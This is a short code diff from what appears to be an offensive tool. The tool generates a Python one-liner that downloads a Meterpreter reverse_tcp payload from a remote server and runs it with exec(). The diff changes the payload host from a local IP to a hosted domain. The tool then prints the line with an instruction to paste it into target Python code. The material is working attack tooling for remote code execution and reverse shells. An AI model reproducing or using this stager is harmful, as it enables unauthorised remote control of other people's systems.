@@ -27,7 +27,7 @@ command = ""
 command += "import urllib.request, json\n"
 if args.threading:
     command += "import threading\nthreading.Thread(target=lambda: "
-command += f"""exec(urllib.request.urlopen(urllib.request.Request("http://{args.ip}:1500/python/meterpreter/reverse_tcp{admin_path}", data=json.dumps({{"LHOST": "{args.ip}", "LPORT": {args.port}}}).encode(), headers={{'Content-Type': 'application/json'}})).read().decode())"""
+command += f"""exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp{admin_path}", data=json.dumps({{"LHOST": "{args.ip}", "LPORT": {args.port}}}).encode(), headers={{'Content-Type': 'application/json'}})).read().decode())"""
 if args.threading:
     command += ").start()"
 print("Copy the following code and paste it in the target python code:")
